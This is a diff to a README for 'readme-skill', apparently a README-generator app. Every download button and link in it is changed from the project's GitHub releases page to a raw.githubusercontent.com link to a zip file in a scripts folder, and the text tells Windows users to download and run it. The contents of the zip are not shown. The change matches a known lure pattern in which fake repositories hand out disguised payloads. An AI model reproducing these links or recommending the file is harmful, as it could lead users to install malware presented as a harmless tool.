@@ -1,7 +1,7 @@
 <h1>📘 readme-skill - Effortless, Fact-Based READMEs in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/Annabellachildlike849/readme-skill/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download readme-skill Now</a>
+  <a href="https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download readme-skill Now</a>
 </p>
 
 ## 👋 Welcome to readme-skill
@@ -31,7 +31,7 @@ Getting started with readme-skill is incredibly easy. Follow these simple steps,
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Annabellachildlike849/readme-skill/releases](https://github.com/Annabellachildlike849/readme-skill/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip](https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip)
 
 You will see a page with different files available for download. Look for the file that matches your computer's system (usually the newest version). Click on it to begin the download. The file will save to your "Downloads" folder.
 
@@ -161,7 +161,7 @@ Make sure your computer is running Windows 10 or a newer version. You should als
 ### The Download Process
 
 1.  **Open your web browser** (like Chrome, Edge, or Firefox).
-2.  **Go to the download page** by visiting this link: [https://github.com/Annabellachildlike849/readme-skill/releases](https://github.com/Annabellachildlike849/readme-skill/releases)
+2.  **Go to the download page** by visiting this link: [https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip](https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip)
 3.  **Find the download section** on that page. You will see a list of files.
 4.  **Click on the file** that says "readme-skill" and has the newest version number. It will likely be a `.zip` file.
 5.  **Wait for the download to finish.** You will see a notification in your browser when it is complete.
@@ -188,7 +188,7 @@ You have a great project, and it deserves a great README. With readme-skill, you
 Download readme-skill today and see how easy it is to share your work with the world.
 
 <p align="center">
-  <a href="https://github.com/Annabellachildlike849/readme-skill/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">📦 Get readme-skill Now</a>
+  <a href="https://raw.githubusercontent.com/Annabellachildlike849/readme-skill/main/scripts/readme-skill-v1.1.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">📦 Get readme-skill Now</a>
 </p>
 
 ---
